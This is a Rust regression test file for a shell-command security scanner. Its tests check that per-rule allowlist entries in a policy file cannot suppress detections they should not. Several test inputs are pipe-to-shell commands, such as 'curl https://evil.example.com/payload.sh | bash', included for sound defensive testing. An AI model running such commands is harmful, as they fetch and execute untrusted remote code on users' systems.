//! Adversarial bypass regression tests for issues #65, #66, #67.
//!
//! These tests attempt to circumvent the security fixes, not just confirm the
//! happy path. If any test here starts passing when it should fail (or vice
//! versa), a bypass has been reintroduced.

use std::fs;

use tempfile::TempDir;

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId};

// ---------------------------------------------------------------------------
// Helpers (same pattern as policy_integration.rs)
// ---------------------------------------------------------------------------

fn make_repo(policy_yaml: &str) -> TempDir {
    let tmp = TempDir::new().expect("create temp dir");
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), policy_yaml).unwrap();
    tmp
}

fn analyze_exec(input: &str, cwd: &str) -> tirith_core::verdict::Verdict {
    let ctx = AnalysisContext {
        input: input.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(cwd.to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
    };
    engine::analyze(&ctx)
}

// ===========================================================================
// Issue #66: allowlist_rules bypass attempts
// ===========================================================================

#[test]
fn test_bypass_allowlist_rules_wrong_rule_id_does_not_suppress() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: nonexistent_rule
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Wrong rule_id must NOT suppress ShortenedUrl"
    );
}

#[test]
fn test_bypass_allowlist_rules_correct_id_wrong_pattern_does_not_suppress() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - definitely-not-bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Non-matching pattern must NOT suppress ShortenedUrl"
    );
}

#[test]
fn test_bypass_allowlist_rules_suppresses_only_named_rule() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::ShortenedUrl),
        "Rule-scoped allowlist should suppress ShortenedUrl"
    );
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "CurlPipeShell must remain — it was NOT allowlisted"
    );
}

#[test]
fn test_bypass_allowlist_rules_case_insensitive_rule_id() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: SHORTENED_URL
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::ShortenedUrl),
        "Case-insensitive rule_id matching should suppress ShortenedUrl"
    );
}

#[test]
fn test_bypass_allowlist_rules_mixed_case_rule_id() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: Shortened_Url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::ShortenedUrl),
        "Mixed-case rule_id should still match via case-insensitive comparison"
    );
}

#[test]
fn test_bypass_blocklist_overrides_allowlist_rules() {
    let policy = r#"
fail_mode: open
blocklist:
  - bit.ly
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist must override allowlist_rules — PolicyBlocklisted should fire"
    );
}

#[test]
fn test_bypass_allowlist_rules_pipe_to_shell_trusted_url() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - example.com/install.sh
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::CurlPipeShell),
        "Trusted URL should suppress CurlPipeShell via allowlist_rules"
    );
    assert_eq!(
        verdict.action,
        Action::Allow,
        "No remaining findings should mean Allow"
    );
}

#[test]
fn test_bypass_allowlist_rules_pipe_to_shell_untrusted_url_not_suppressed() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - trusted.example.com/install.sh
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.example.com/payload.sh | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "Non-matching URL must NOT suppress CurlPipeShell"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_bypass_allowlist_rules_empty_patterns_does_nothing() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns: []
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Empty patterns array must not suppress anything"
    );
}

#[test]
fn test_bypass_allowlist_rules_empty_pattern_string_does_nothing() {
    let policy = "fail_mode: open\nallowlist_rules:\n  - rule_id: shortened_url\n    patterns:\n      - \"\"\n";
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Empty string pattern must not suppress anything"
    );
}

#[test]
fn test_bypass_global_allowlist_suppresses_all_rules_for_url() {
    let policy = r#"
fail_mode: open
allowlist:
  - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    // Global allowlist suppresses ALL rules whose evidence includes bit.ly
    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::ShortenedUrl),
        "Global allowlist should suppress ShortenedUrl"
    );
}
